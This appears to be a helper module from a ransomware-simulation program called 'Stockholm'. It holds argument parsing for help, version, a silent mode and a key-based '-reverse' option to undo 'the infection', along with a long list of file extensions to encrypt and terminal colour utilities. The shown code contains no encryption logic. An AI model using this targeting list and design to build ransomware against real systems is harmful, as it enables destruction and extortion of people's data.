import argparse


class Arguments:

    def __init__(self):

        parser = argparse.ArgumentParser(add_help=False)

        parser.add_argument("-h", "-help", action="store_true", default=False)
        parser.add_argument("-v", "-version", action="store_true", default=False)
        parser.add_argument("-r", "-reverse", type=str, nargs=1, default=None)
        parser.add_argument("-s", "-silent", action="store_true", default=False)

        args = parser.parse_args()

        self.help = args.h
        self.version = args.v
        self.reverse = args.r
        self.silent = args.s
        super().__init__()


    def display_help(self):
        map_help = ["""◦ The program has the option "-help" or "-h" to display the help.""",
            """◦ The program has the option "-version" or "-v" to show the version of""",
            """the program.""",
            """◦ The program has the option "-reverse" or "-r" followed by the key entered""",
            """as an argument to reverse the infection.""",
            """◦ The program shows each encrypted file during the process unless the""",
            """option is indicated "-silent" or "-s", in which case the program will not produce""",
            """any output."""
        ]
        print(*map_help, sep="\n")
        return


    def display_version(self):
        print("Version: Stockholm 1.0.0")


class Extensions:
    def __init__(self):
        self.extensions = ".der .pfx .key .crt .csr .p12 .pem .odt .ott .sxw .stw .uot .3ds .max .3dm .ods .ots .sxc .stc .dif .slk .wb2 .odp .otp .sxd .std .uop .odg .otg .sxm .mml .lay .lay6 .asc .sqlite3 .sqlitedb .sql .accdb .mdb .db .dbf .odb .frm .myd .myi .ibd .mdf .ldf .sln .suo .cs .c .cpp .pas .h .asm .js .cmd .bat .ps1 .vbs .vb .pl .dip .dch .sch .brd .jsp .php .asp .rb .java .jar .class .sh .mp3 .wav .swf .fla .wmv .mpg .vob .mpeg .asf .avi .mov .mp4 .3gp .mkv .3g2 .flv .wma .mid .m3u .m4u .djvu .svg .ai .psd .nef .tiff .tif .cgm .raw .gif .png .bmp .jpg .jpeg .vcd .iso .backup .zip .rar .7z .gz .tgz .tar .bak .tbk .bz2 .PAQ .ARC .aes .gpg .vmx .vmdk .vdi .sldm .sldx .sti .sxi .602 .hwp .snt .onetoc2 .dwg .pdf .wk1 .wks .123 .rtf .csv .txt .vsdx .vsd .edb .eml .msg .ost .pst .potm .potx .ppam .ppsx .ppsm .pps .pot .pptm .pptx .ppt .xltm .xltx .xlc .xlm .xlt .xlw .xlsb .xlsm .xlsx .xls .dotx .dotm .dot .docm .docb .docx .doc .ft".split()
        super().__init__()
        pass


class bcolors:
    HEADER = '\033[95m'  # Light Magenta
    OKBLUE = '\033[94m'  # Blue
    OKCYAN = '\033[96m'  # Cyan
    OKGREEN = '\033[92m'  # Green
    WARNING = '\033[93m'  # Yellow
    FAIL = '\033[91m'  # Red
    ENDC = '\033[0m'  # Reset
    BOLD = '\033[1m'  # Bold
    UNDERLINE = '\033[4m'  # Underline
    
    # Additional Colors
    BLACK = '\033[30m'  # Black
    RED = '\033[31m'  # Dark Red
    GREEN = '\033[32m'  # Dark Green
    YELLOW = '\033[33m'  # Dark Yellow / Orange
    BLUE = '\033[34m'  # Dark Blue
    MAGENTA = '\033[35m'  # Dark Magenta
    CYAN = '\033[36m'  # Dark Cyan
    WHITE = '\033[37m'  # White
    
    # Bright Versions
    BRIGHT_BLACK = '\033[90m'  # Gray
    BRIGHT_RED = '\033[91m'  # Bright Red
    BRIGHT_GREEN = '\033[92m'  # Bright Green
    BRIGHT_YELLOW = '\033[93m'  # Bright Yellow
    BRIGHT_BLUE = '\033[94m'  # Bright Blue
    BRIGHT_MAGENTA = '\033[95m'  # Bright Magenta
    BRIGHT_CYAN = '\033[96m'  # Bright Cyan
    BRIGHT_WHITE = '\033[97m'  # Bright White


def _change_color(s, ed=""):
    print(s, end=ed)
    

def print_content(filename, content):
    print(filename)
    print(content)
    print()
    
def print_header(s):
    print()
    print(s.center(40, "~"))
    print()